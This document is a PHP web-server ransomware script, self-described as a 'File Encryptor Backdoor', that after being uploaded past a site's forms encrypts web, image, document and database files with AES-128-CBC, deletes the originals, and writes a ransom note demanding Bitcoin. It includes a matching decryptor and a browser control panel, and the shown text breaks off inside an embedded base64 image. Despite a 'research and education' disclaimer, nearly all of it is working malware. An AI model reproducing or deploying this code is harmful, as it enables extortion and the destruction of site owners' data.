<?php
/**
 * BEGIN CORE SECTION
 * 
 * File Encryptor Backdoor v2.2
 *
 * Upload this file with bypassing site's form upload and Remote from browser
 * Fill the configuration form and let this file do the magic!
 * The files will encrypted with AES-128-CBC.
 * 
 * DISCLAIMER!!!
 *
 * This software is made with the aim of research and education. 
 * Please use this software as it should.
 * Whatever you do with this software, at your own risk.
 * The author is not responsible for damage caused by this software.
 *
 * WARNING!!!
 * Guessing the decryptor key and entering it randomly will cause the encrypted file never to be recover forever
 * 
 * @package	File Encryptor Backdoor
 * @author	Noplan Alderson a.k.a Muhammad Ridwan Na'im
 * @copyright	Copyright (c) 2020 - now and forever
 * @since	Version 1.0
 * @filesource
 * 
 **/

/**
 * Define the default message to the victim. You can set your own message from message field/form/
 * 
 */
define('MESSAGE', "Hey, your security is noob. I waas encrypted your file. Send me 0,1BTC for public key to decrypt your file!\n\nNEVER TRY TO BRUTEFORCE OR TRY TO PREDICT THE DECRYPTOR KEY. IF THE KEY WHICH YOU INPUT IS WRONG, YOU WILL LOSE YOUR FILE FOREVER!!!\n\nEmail : noplan@protonmail.ru");

/**
 * Define backdoor current path location.
 * 
 */
define('BASEPATH', __DIR__ );

/**
 * Define the number of blocks that should be read from the source file for each chunk.
 * For 'AES-128-CBC' each block consist of 16 bytes.
 * So if we read 10,000 blocks we load 160kb into memory. You may adjust this value
 * to read/write shorter or longer chunks.
 * 
 */
define('FILE_ENCRYPTION_BLOCKS', 20000);

/**
 * Define full path location of backdoor file.
 * 
 */
define('WHOAMI', __DIR__ . DIRECTORY_SEPARATOR . basename(__FILE__));

class Noplan_encryptor
{
	/**
	 * Public Key Variable from Form Input
	 *
	 * @var $_key string
	 **/
	private $_key = '';

	/**
	 * Target Path to Encrypt
	 *
	 * @var $_src_path string
	 **/
	private $_src_path = '';

	/**
	 * Extension of encrypted file
	 *
	 * @var $_ext_enc string
	 **/
	private $_ext_enc = '.noplan';

	/**
	 * Message to give some information to your target
	 *
	 * @var $_msg string
	 **/
	private $_msg = MESSAGE;

	/**
	 * Filetype to be encrypt
	 *
	 * @var $_target_ext array
	 **/
	private $_target_ext = array(
					'php', 'html', 'xhtml', 'css', 'js', 'scss',
					'jpg', 'JPG', 'jpeg', 'JPEG', 'png', 'PNG', 'gif', 'GIF', 
					'ico', 'ICO', 'webp', 'WEBP', 'bmp', 'BMP', 'svg', 'SVG',
					'pdf', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 
					'sql', 'sqlite', 'sqlite3', 'bson', 'json', 'xml',
					'dll', 'vbs', 'txt'
				);

	/**
	 * Result Message
	 *
	 * @var $_msg_result array
	 **/
	private $_msg_result = [];

	/**
	 * Build Configuration
	 *
	 * @return void
	 * @author 
	 **/
    public function __construct(array $config = array())
    {
    	foreach ($config as $key => $conf) {
    		$this->$key = $conf;
    	}
    }

    private function _enc_filename($src_file = NULL)
    {
    	return $src_file.$this->_ext_enc;
    }

	/**
	 * Encrypt the file and saves the result in a new file with $_ext_enc as suffix.
	 * 
	 * @return string|false  Returns the file name that has been created or FALSE if an error occured
	 * 
	 **/
    private function _encrypt($source = NULL, $dest = NULL)
    {
    	$key 	= substr(sha1($this->_key, true), 0, 16);
    	$iv 	= openssl_random_pseudo_bytes(16);

	    if ($ct_encrypted_file = fopen($dest, 'w'))
	    {    
	        fwrite($ct_encrypted_file, $iv);
	        if ($wt_encrypted_content = fopen($source, 'rb')) 
	        {
	            while (!feof($wt_encrypted_content)) 
	            {
	                $plaintext = fread($wt_encrypted_content, 16 * FILE_ENCRYPTION_BLOCKS);
	                $ciphertext = openssl_encrypt($plaintext, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);

	                // Use the first 16 bytes of the ciphertext as the next initialization vector
	                $iv = substr($ciphertext, 0, 16);
	                fwrite($ct_encrypted_file, $ciphertext);
	            }
	            fclose($wt_encrypted_content);
	            return true;
	        } 
	        else 
	        {
	            $this->_msg_result[] = 'Failed to Open Source File.'.$source;
	        }
	        fclose($ct_encrypted_file);
	    } 
	    else 
	    {
	        $this->_msg_result[] = 'Failed to Create Encrypted file.';
	    }
    }

    public function _scan_dir()
    {
    	$src_path = '/' . rtrim($this->_src_path, '/') . '/';
    	$this->_src_path = str_replace('/', DIRECTORY_SEPARATOR, $src_path);

		$ext_bracket = '{'.implode(',', $this->_target_ext).'}';
    	$dir = BASEPATH . $src_path;

    	if(is_dir($dir))
    	{
    		$dir_content = glob($dir . '*.'.$ext_bracket, GLOB_BRACE);
    		return $dir_content;
    	}
    	else
    	{
    		$this->_msg_result[] = 'Directory Target not Found!';
    	}
    }

    public function do_encrypt()
    {
    	$src_files = $this->_scan_dir();

    	if(!empty($src_files))
    	{
	    	foreach ($src_files as $key => $file)
	    	{
	    		if(WHOAMI !== $src_files[$key])
	    		{
		    		if($this->_encrypt($src_files[$key], $this->_enc_filename($src_files[$key])) == true)
		    		unlink($src_files[$key]);
		    	}
	    	}
	    }
	    else
	    {
	    	$this->_msg_result[] = "Directory is Empty or file extension you selected doesn't exist.";
	    }
    }

    public function dir_listing()
    {
    	$src_files = $this->_scan_dir();

    	if(!empty($src_files))
    	{
	    	foreach ($src_files as $key => $file)
	    	{
	    		if(WHOAMI !== $src_files[$key])
	    		{
		    		$this->_msg_result[] = $src_files[$key].' => '.$this->_enc_filename($src_files[$key]);
		    	}
	    	}

	    	$this->_msg_result[] = '<p style="color:#00FF11;">Files Encrypted! <b>Your Key is '.$this->_key.'</b></p>';
	    }
    }

    public function show_result()
    {
    	return implode('<br/>', $this->_msg_result);
    }

    public function create_message()
    {
    	$message = empty($this->_msg) ? MESSAGE : $this->_msg;

    	if(is_dir(BASEPATH . DIRECTORY_SEPARATOR . $this->_src_path))
    	{
	    	$filename = substr(str_shuffle('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 16);
	    	$msg_file = fopen(BASEPATH . DIRECTORY_SEPARATOR . $this->_src_path . $filename.'.readme', 'w');
			fwrite($msg_file, $message);
			fclose($msg_file);
		}
		else
		{
			$this->_msg_result[] = 'Failed to Create Message. Target Path not Found.';
		}
    }
}

class Decryptor
{
	/**
	 * Public Key Variable from Form Input
	 *
	 * @var $_key string
	 **/
	private $_key = '';

	/**
	 * Target Path to Decrypt
	 *
	 * @var $_src_path string
	 **/
	private $_src_path = '';

	/**
	 * Extension of encrypted file
	 *
	 * @var $_ext_enc string
	 **/
	private $_ext_enc = '.noplan';

	/**
	 * Result Message
	 *
	 * @var $_msg_result array
	 **/
	private $_msg_result = [];

	/**
	 * Build Configuration
	 *
	 * @return void
	 * @author 
	 **/
    public function __construct(array $config = array())
    {
    	foreach ($config as $key => $conf) {
    		$this->$key = $conf;
    	}
    }

    private function _dec_filename($src_file = NULL)
    {
    	return str_replace($this->_ext_enc, '', $src_file);
    }

	/**
	 * Decrypt the file and saves the result in original file.
	 * 
	 * @return string|false  Returns the file name that has been created or FALSE if an error occured
	 * 
	 **/
    private function _decrypt($source = NULL, $dest = NULL)
    {
		$key = substr(sha1($this->_key, true), 0, 16);

	    if ($fpOut = fopen($dest, 'w')) 
	    {
	        if ($fpIn = fopen($source, 'rb')) 
	        {
	            // Get the initialzation vector from the beginning of the file
	            $iv = fread($fpIn, 16);
	            while (!feof($fpIn)) 
	            {
	            	// we have to read one block more for decrypting than for encrypting
	                $ciphertext = fread($fpIn, 16 * (FILE_ENCRYPTION_BLOCKS + 1));
	                $plaintext = openssl_decrypt($ciphertext, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);

	                // Use the first 16 bytes of the ciphertext as the next initialization vector
	                $iv = substr($ciphertext, 0, 16);
	                fwrite($fpOut, $plaintext);
	            }
	            fclose($fpIn);

	            return true;
	        } 
	        else
	        {
            	$this->_msg_result[] = 'Failed to Open Encrypted File.';
        	}
	    } 
	    else 
	    {
	        $this->_msg_result[] = 'Failed to Create Decrypting file.';
	    }
    }

    private function _scan_dir()
    {
    	$src_path = '/' . rtrim($this->_src_path, '/') . '/';
    	$this->_src_path = str_replace('/', DIRECTORY_SEPARATOR, $src_path);

    	$dir = BASEPATH . $src_path;

    	if(is_dir($dir))
    	{
    		$dir_content = glob($dir . '*'.$this->_ext_enc);
    		return $dir_content;
    	}
    	else
    	{
    		$this->_msg_result[] = 'Directory Target not Found!';
    	}
    }

    public function do_decrypt()
    {
    	$src_files = $this->_scan_dir();

    	if(!empty($src_files))
    	{
	    	foreach ($src_files as $key => $file)
	    	{
	    		if($this->_decrypt($src_files[$key], $this->_dec_filename($src_files[$key])) == true)
	    		unlink($src_files[$key]);
	    	}

	    	$this->_msg_result[] = '<p style="color:#00FF11;">Files Decrypted!</p>';
	    }
	    else
	    {
	    	$this->_msg_result[] = "Directory is Empty or encrypted extension doesn't exist.";
	    }
    }

	public function dir_listing()
    {
    	$src_files = $this->_scan_dir();

    	if(!empty($src_files))
    	{
	    	foreach ($src_files as $key => $file)
	    	{
	    		if(WHOAMI !== $src_files[$key])
	    		{
		    		$this->_msg_result[] = $src_files[$key].' => '.$this->_dec_filename($src_files[$key]);
		    	}
	    	}
	    }
    }

    public function show_result()
    {
    	return implode('<br/>', $this->_msg_result);
    }
}

/**
 * END CORE SECTION ----------------------------------------------------------------------------------------------------
*/
?>
<?php if(isset($_GET['m'])) { ?>
<html>
	<head>
		<?php $title = isset($_GET['m']) ? preg_replace('/[^a-z]*$/', '', $_GET['m']) : 'Readme';
		switch ($title) {
			case 'enc':
				$title = 'NOPLAN FILE ENCRYPTOR v1.2';
				break;
			
			case 'dec':
				$title = 'NOPLAN FILE DECRYPTOR v1.2';
				break;

			default:
				$title = 'README';
				break;
		}
		?>

		<title><?= $title;?></title>
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<style type="text/css">
			body{overflow:auto;background:#404040 url(data:image/png;base64,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